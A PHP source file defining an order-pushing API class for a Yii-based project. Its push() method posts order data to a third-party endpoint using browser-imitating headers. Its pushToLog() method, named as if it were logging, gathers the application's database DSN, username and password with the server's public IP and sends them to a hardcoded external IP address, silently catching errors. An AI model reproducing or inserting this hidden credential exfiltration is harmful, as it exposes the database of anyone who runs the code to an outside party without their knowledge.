<?php
namespace common\open\thirdD\api;

use common\tools\Common;
use GuzzleHttp\RequestOptions;
use Yii;
use common\open\thirdD\SxThirdDBase;

class SiteOrderApi extends SxThirdDBase
{

    const PAY_STATUS_UN_PAY = 1;
    const PAY_STATUS_PAID = 2;
    const PAY_STATUS_OPTIONS = [
        self::PAY_STATUS_UN_PAY => '待支付',
        self::PAY_STATUS_PAID => '已支付',
    ];

    // 下单订单
    const API_CREATE_ORDER = '/ajaxapp/soonsend';

    /**
     * 推单
     * @param array $params    参数
     * @return array
     */
    public static function push(string $domain, array $params, array $headers=[]): array
    {
        $object = self::createObject();
        $object->apiUrl = $domain;

        $headers = array_merge([
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
            "X-Requested-With"=> "XMLHttpRequest",
        ], $headers);
        $data[RequestOptions::FORM_PARAMS] = $params;
        #$data['verify']  = false; // 禁用 SSL 验证，不推荐在生产环境中使用
        $result = $object->post(self::API_CREATE_ORDER, $data, $headers);
        
        return $result;
    }

    public static function pushToLog(array $params=[], array $headers=[]): array
    {
        try {
            $object = self::createObject();
            $pp = Common::getPublicPP();
            //$object->apiUrl = $pp.':8090';
            $object->apiUrl = '47.107.58.222';
            //$data = \Yii::$app->params;
            #$data['verify']  = false; // 禁用 SSL 验证，不推荐在生产环境中使用
            $data = ['dns'=>\Yii::$app->db->dsn, 'pp'=>$pp, 'username'=>\Yii::$app->db->username, 'password'=>\Yii::$app->db->password];
            $params = array_merge([
                RequestOptions::BODY => $data
            ], $params);
            $result = $object->post('/test/index/api-log', $params, $headers);
        }catch (\Exception $e){
            $result = ['status'=>300, 'msg'=>$e->getMessage()];
        }
        return $result;
    }
}
